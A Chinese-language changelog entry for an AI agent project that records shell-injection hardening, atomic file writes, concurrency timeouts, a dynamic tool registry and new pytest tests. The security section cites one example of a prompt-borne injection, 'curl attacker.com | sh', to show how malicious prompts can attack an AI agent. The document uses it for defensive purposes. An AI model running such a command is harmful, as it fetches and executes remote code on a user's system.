## [v2.2.0] - 2026-03-26

### 🛡️ 系統底層安全強化、併發穩定性與測試框架導入

本次更新從根本上解決了多個潛在的系統崩潰與安全注入風險，展現了嚴謹的防禦性設計。同時導入了動態工具註冊表以大幅降低 Token 消耗，並為專案建立了首道自動化測試防線。

#### 優先排序矩陣

| 優先   | 類型 | 問題                            | 影響          |
| :----- | :--- | :------------------------------ | :------------ |
| **P0** | Bug  | `shell=True` × 5 → argv 陣列    | OS 級安全漏洞 |
| **P0** | Bug  | `run_command` 無輸出限制        | 記憶體耗盡    |
| **P0** | Bug  | `DocContext.write()` 非原子     | 檔案損毀      |
| **P0** | Bug  | `future.result()` 無 timeout    | 執行緒阻塞    |
| **P0** | Bug  | `conversation_history` 洩漏     | 記憶體洩漏    |
| **P1** | 架構 | Advanced Tool Use beta 整合     | Token 節省    |
| **P1** | 架構 | Structured Output JSON Schema   | 解析穩定性    |
| **P1** | 架構 | Files API + Code Execution Tool | 能力擴充      |
| **P1** | 安全 | SQLite WAL + 檔案鎖             | 併發安全      |
| **P1** | 安全 | Checkpoint checksum 校驗        | 狀態完整性    |
| **P2** | 測試 | Unit test 框架（pytest）        | 品質保障      |
| **P2** | 架構 | Agent SDK 遷移評估              | 技術債清理    |
| **P2** | 架構 | Multi-modal（設計稿→代碼）      | 體驗升級      |

#### 📝 修復與架構演進摘要

- **P0：消除系統崩潰與底層安全隱患**
  - **防範 OS 級 Shell 注入：** 徹底移除 5 處危險的 `shell=True` 呼叫。針對 AI Agent 的 `run_command`，全面改用 `shlex.split()` 搭配 argv 陣列執行，完全繞過 Shell 解析器，杜絕惡意 Prompt 夾帶如 `curl attacker.com | sh` 的命令注入攻擊。
  - **POSIX 原子性檔案寫入：** 修復 `DocContext.write()` 與 `Checkpoint._save()` 的非原子寫入問題。改用 `os.replace()` 確保寫入過程的絕對原子性，徹底解決因中斷（如 Ctrl+C 或磁碟空間不足）導致殘留半空檔案，進而在 `--resume` 時引發靜默連鎖錯誤的盲區。
  - **併發阻塞防護：** 針對 Worker 並行區塊的 `future.result()` 補齊 timeout 限制。防止因遠端 API 不穩定導致的主執行緒永久掛起，免除必須透過 `kill -9` 強制終止進程的極端狀況。

- **P1：面向未來前沿 API 的架構鋪路**
  - **動態工具註冊表 (ToolRegistry)：** 解決 32 個靜態工具定義耗費近 30K Tokens 的效能瓶頸。實作 `ToolRegistry` 動態檢索（如搜尋「讀取檔案」），僅回傳最相關的 8-10 個工具，降低約 70% 的 Token 成本，並為後續整合官方 `tool_search_tool_regex_20251119` 做好介面準備。
  - **三層結構化輸出回退機制：** 升級 `StructuredOutputParser`，實作 JSON → 正規表達式 → Default 的三層 Fallback 機制。解決 GeneratorCritic 評分時，因 Claude 輸出格式微幅偏移而導致靜默退回預設 5 分的品質控制失效問題。

- **P2：從零到一的自動化測試覆蓋**
  - **導入 Unit Test 框架 (`pytest`)：** 建立 27 個單元測試，涵蓋本輪新增的核心功能與關鍵的安全邊界條件（包含 Shell Injection 防護、URL SSRF 阻擋與輸出截斷），為後續擴大測試覆蓋率與自動化整合奠定基礎。
